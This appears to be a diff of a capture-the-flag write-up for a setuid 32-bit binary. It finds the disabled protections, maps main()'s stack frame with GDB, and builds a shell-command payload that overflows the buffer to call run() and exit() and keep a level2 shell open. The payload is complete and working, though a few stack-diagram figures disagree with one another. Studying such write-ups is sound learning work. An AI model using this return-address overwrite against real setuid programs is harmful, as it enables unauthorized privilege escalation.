@@ -28,6 +28,8 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
 ```
 
+By calling `find /proc/sys/kernel -name "randomize_va_space" -exec cat {} +`, we discover that [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is disabled.
+
 We also discover that the flag is owned by `level2` and has the `setuid` flag set.
 ```sh
 ls -la ~/level1
@@ -52,95 +54,156 @@ In parallel, the kernel and binary do not implement modern security practices *(
 
 ## Vulnerability analysis
 
-We wish to perform a stack overflow. We must analyze how this 32-bit binary's stack operates.
+We have a **32-bit x86** (elf32-i386) binary containing two user defined functions.
+To perform a **stack overflow** attack, we need to analyze and visualize the program's [**call stack**](https://en.wikipedia.org/wiki/Call_stack). More specifically the target functions **stack frame**.  
+We target the `main()` function.
 
-Traditionally, a 32-bit function **call** follows this pattern:
-1. The **Return Address** is pushed onto the stack **(-4 bytes)**, derived from the address of the instruction after the CALL instruction.
-2. The CPU jumps to the called function's address.
-3. The **caller's Stack Base Pointer (EBP)** is pushed onto the stack **(-4 bytes)**.
-4. The EBP register takes the value of the current Stack Pointer (ESP).
-5. The function allocates space for **local variables** on the stack **(-N bytes)** by decreasing the value held by the ESP register.
+A function's lifetime is split into 4 steps:
+1. **Call/Setup (Caller)**:
+    Prepares arguments (via registers or stack) and pushes the **Return Address** onto the stack (via the `CALL` instruction).
+2. **Prologue (Callee)**:
+    Saves the caller's base pointer to the stack and updates it to the current stack pointer to establish a new frame.
+3. **Runtime (Callee)**:
+    Executes function logic and allocates space for local variables.
+4. **Epilogue (Callee)**:
+    Deallocates the stack frame (ESP is restored to EBP), restores the saved caller's stored base pointer, and executes `RET` to jump to the Return Address.
 
-Model of typical 32-bit x86 stack frame (post function prologue):
+We execute our **stack overflow** typically at the Runtime stage. At that point, memory should look like this:
 ```ruby
     HIGHER MEMORY ADDRESSES    
++-----------------------------+
+|    Stack-Based arguments    | (0-N bytes)
 +-----------------------------+
 |        Return address       | (4 bytes)
 +-----------------------------+
 | Caller's Stack Base Pointer | (4 bytes)
 +-----------------------------+ <--- Stack Base Pointer (EBP)
-|       Memory alignment      | (0-15 bytes)
+|         Stack Canary        | (0-4 bytes)
++-----------------------------+
+|           Padding           | (0-15 bytes)
 +-----------------------------+
 |                             |
 |                             |
 |                             |
 |       Local Variables       | (0-N bytes)
+|     (+ alignment bytes)     |
 |                             |
 |                             |
 |                             |
 +-----------------------------+ <--- Stack Pointer (ESP)
      LOWER MEMORY ADDRESSES    
 ```
+Notices:
+- The stack is little-endian encoded. In our payload, multi-byte values must be byte-reversed.
+- On modern optimized systems, the first function parameters are typically passed via volatile registers (ex: EAX, ECX, EDX)
+- The stack is built downwards, from higher to lowerer memory addresses. Local variables are written upwards.
+- The function's stack frame begins officially from the last address pushed into the **EBP** register.
 
-Traditionally, once the function finishes, it performs its [epilogue](https://en.wikipedia.org/wiki/Function_prologue_and_epilogue), following this pattern:
-1. **Local variable** stack space is released **(+N bytes)** by moving the Stack Pointer (ESP) back to the value of the Stack Base Pointer (EBP).
-2. The **caller's Stack Base Pointer (EBP)** is restored by popping it from the stack **(+4 bytes)**.
-3. The **Return Address** is popped from the stack **(+4 bytes)** into the Instruction Pointer (EIP).
-4. The CPU resumes execution at the restored Return Address.
+As the kernel's [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) option is disabled, we can use [GDB](https://www.sourceware.org/gdb/) identify the static addresses in a given stack frame.
+```sh
+$ gdb -ex "start" -ex "info frame" --args ./level1;
+# ...
+Temporary breakpoint 1 at 0x8048483
+Starting program: /home/user/level1/level1 
 
-> For each 32-bit x86 function call, the stack usage increase ranges from **8 to 8+N bytes**.
+Temporary breakpoint 1, 0x08048483 in main ()
+Stack level 0, frame at 0xbffff740:
+ eip = 0x8048483 in main; saved eip 0xb7e454d3
+ Arglist at 0xbffff738, args: 
+ Locals at 0xbffff738, Previous frame's sp is 0xbffff740
+ Saved registers:
+  ebp at 0xbffff738, eip at 0xbffff73c
+# ...
+```
 
-By analyzing the [source.c](./source.c) and [source.asm](./source.asm) files, we observe that the program allocates 76 bytes on the stack for the buffer. Since the buffer written to by `gets()` is the only local variable declared on the stack, we do not need to consider the ordering of local variables.
+After the additional analysis of the [source.asm](./source.asm) file,  
+we determined that the `main()` function stack frame would ressemble this:
+```ruby
+      HIGHER MEMORY ADDRESSES     
++--------------------------------+
+|     main()'s Return address    | (4 bytes @ 0xbffff73c)
++--------------------------------+ <--- Begin of `main()` stack frame.
+|   Caller's Stack Base Pointer  | (4 bytes @ 0xbffff738)
++--------------------------------+ <--- Stack Base Pointer (EBP)
+|  | Alignment  | (8 bytes)      |
++  +------------+                |
+|  |            |                |
+|  |            |                |
+|  |   Buffer   | (64 bytes)     | (88 bytes)
+|  |            |                |
+|  |            |                |
++  +------------+ (@ 0xbffff6f0) |
+|  | Alignment  | (16 bytes)     |
++--------------------------------+ <--- Stack Pointer (ESP)
+      LOWER MEMORY ADDRESSES      
+```
 
 ## Exploit
 
-Our objective is, through a stack overflow, to overwrite data on the stack, specifically the **Return Address**, and therefore indirectly control the Instruction Pointer (EIP). This allows us to **hijack and redirect the program's execution flow** to code located at an address we control.
+By overwriting the **Return Address**, we can hijack the program's control flow to execute arbitrary code: hidden functions, library code, or even injected [shellcode](https://en.wikipedia.org/wiki/Shellcode) payloads.
 
-Since the [No-eXecute (NX)](https://ctf101.org/binary-exploitation/no-execute/) bit is disabled, the stack is executable. Therefore, the Instruction Pointer (EIP) can be redirected to execute code placed directly on the stack.
+We wish to execute commands such as `system("/bin/sh")` or `execve("/bin/sh", NULL, NULL)` to spawn a new shell that inherits the EUID *(level2)* of the process.
 
-We have two options:
-1. Redirect the code to an existing vulnerable function, such as `run()`, as seen in [source.c](./source.c) file.
-2. Redirect the code to malicious injected valid machine code, such as a syscall.
+The `run()` function available in the binary calls `system("/bin/sh")` for us. It's stack frame starts at the following address: `0x08048444` (or `\x44\x84\x04\x08` in **little-endian hexadecimal byte escaped format**).
 
-Buffer overflow model
 ```sh
-                      Write direction ->>>                      
-
-[............BUFFER............][..EBP..][.....Return Addr.....]
-|           76 Bytes           ||4 Bytes||       4 Bytes       |
-|                   STACK LAYOUT PRE-OVERFLOW                  |
-
-[................PAYLOAD................][.... Exploit addr....]
-|           76 + 4 = 80 Bytes           ||       4 Bytes       |
-|                  STACK LAYOUT POST-OVERFLOW                  |
+$ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
+$ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
+$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ payload="${local_vars_filler}${ebp_filler}${run_retaddr}";
+$ (echo -ne "$payload\n") | ~/level1
+Good... Wait what?
+Segmentation fault (core dumped)
 ```
 
+The `run()` function has successfully been called, as confirmed by the output.  
+However, there are two issues we wish to resolve.
 
-"/bin/sh"
-```asm
+**Segmentation Fault:**
 
+Since `run()` was not invoked via a `CALL` instruction, the stack lacks the standard Return Address. Consequently, its stack frame is built with a **4 byte offset** relative to `main()`'s, while otherwise maintaining the expected internal structure. As such, we know exactly where the Return Address is expected and can manually provide one to maintain control or trigger a clean exit.
+
+```ruby
+      HIGHER MEMORY ADDRESSES   
++--------------------------------+
+|   next_fn()'s Return address   | (4 bytes @ 0xbffff738)
++--------------------------------+
+|     main()'s Return address    | (4 bytes @ 0xbffff73c)
++--------------------------------+ <--- Begin of `main()` stack frame.
+|   Caller's Stack Base Pointer  | (4 bytes @ 0xbffff738)
++--------------------------------+ <--- Stack Base Pointer (EBP)
+|               ...              |
+      LOWER MEMORY ADDRESSES      
 ```
 
-<!-- The injected malicious code must consist of valid machine code, ideally represented as hexadecimal byte values for flexibility and compactness.
-
-To trigger a privilege escalation, we wish to replace the current process with a shell while keeping the current EUID *(level 2)*.
-
-By considering the following [syscall table](https://filippo.io/linux-syscall-table/), we decided that the `execve syscall (%rax = 59)` would be an appropriate candidate.
-
-```
-"/bin/sh\0"
-mov eax, 59
-mov ebx, path
-mov ecx, 0
-mov edx, 0
-syscall
+```sh
+$ gdb -ex "start" -ex "p exit" ./level1
+$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit> # <=> \xe0\xeb\xe5\xb7
 ```
 
-<!-- "/bin/sh\0" = 8 bytes
-mov rax,59
-eax -->
+```sh
+$ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
+$ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
+$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ exit_retaddr="$(printf "\xe0\xeb\xe5\xb7")"; # `run()`s Return address, set to `exit()` = 4 bytes.
+$ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
+$ (echo -ne "$payload\n") | ~/level1
+Good... Wait what?
+```
 
--------------------
+**Premature shell exit**
 
-/bin/sh\0
- -->
+The spawned shell closes immediately because it interprets the `EOF` signal sent once the piped input stream finishes.
+To prevent this, we must keep the input stream's write end open for the lifetime of the spawned shell.
+
+```sh
+$ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
+$ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
+$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ exit_retaddr="$(printf "\xe0\xeb\xe5\xb7")"; # `run()`s Return address, set to `exit()` = 4 bytes.
+$ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
+$ (echo -ne "$payload\n"; cat -) | ~/level1
+Good... Wait what?
+```
+
+And there it is.
